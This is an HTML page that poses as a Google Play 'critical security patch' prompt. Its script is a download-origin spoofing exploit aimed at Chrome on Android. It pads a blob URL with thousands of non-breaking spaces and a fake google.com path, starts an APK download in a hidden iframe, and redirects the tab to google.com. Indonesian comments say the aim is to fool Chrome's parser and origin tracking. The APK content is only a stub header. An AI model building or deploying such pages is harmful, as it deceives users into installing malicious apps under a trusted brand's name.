<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Update</title>
</head>
<body style="background:#f1f3f4; font-family:sans-serif; text-align:center; padding-top:100px;">

    <div style="padding:40px; background:#fff; border-radius:12px; display:inline-block; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
        <h2 style="color:#1a73e8; margin-top:0;">Google Play</h2>
        <p>A critical security patch is ready.</p>
        <button id="pwnBtn" style="padding:15px 30px; background:#1a73e8; color:#fff; border:none; border-radius:6px; cursor:pointer; font-weight:bold;">INSTALL NOW</button>
    </div>

<script>
    document.getElementById('pwnBtn').addEventListener('click', function() {
        const spoofDomain = "www.google.com";
        const filename = "Google_Update.apk";
        
        // Karakter khusus untuk mengecoh parser Chrome
        const nbSpace = decodeURIComponent("%C2%A0");
        const padding = nbSpace.repeat(3000); 
        const fakeUrl = `https://${spoofDomain}/update/system-patch-v105/`;

        // 1. Buat Payload APK
        const content = new Uint8Array([0x50, 0x4B, 0x03, 0x04]); 
        const blob = new Blob([content], {type: "application/vnd.android.package-archive"});
        const blobUrl = URL.createObjectURL(blob);
        const finalPayload = blobUrl + "#" + padding + fakeUrl;

        // 2. TEKNIK IFRAME: Buat iframe transparan untuk memicu download
        // Ini seringkali membingungkan "Origin Tracker" pada Chrome Android
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);

        // 3. Eksekusi Download di dalam context Iframe
        iframe.src = finalPayload;

        // 4. Sinkronisasi Address Bar
        // Kita paksa tab utama berpindah ke Google saat dialog download sedang dipersiapkan
        window.location.replace("https://www.google.com/android/update");

        // Cleanup
        setTimeout(() => {
            URL.revokeObjectURL(blobUrl);
            document.body.removeChild(iframe);
        }, 2000);
    });
</script>
</body>
</html>
